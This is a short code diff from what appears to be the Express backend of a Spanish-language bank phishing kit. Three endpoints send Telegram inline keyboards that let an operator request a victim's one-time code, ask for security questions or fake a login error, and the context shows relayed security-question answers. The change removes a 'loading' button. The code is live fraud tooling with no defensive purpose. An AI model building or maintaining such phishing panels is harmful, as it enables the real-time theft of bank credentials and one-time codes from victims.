@@ -68,8 +68,7 @@ app.post('/enviar', async (req, res) => {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
+      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],    
       [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
       [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
@@ -135,7 +134,6 @@ ${pregunta2}❓ : ${respuesta2}
   const keyboard = {
     inline_keyboard: [
       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
       [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
       [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
@@ -198,8 +196,7 @@ app.post('/enviar3', async (req, res) => {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
+      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],      
       [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
       [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
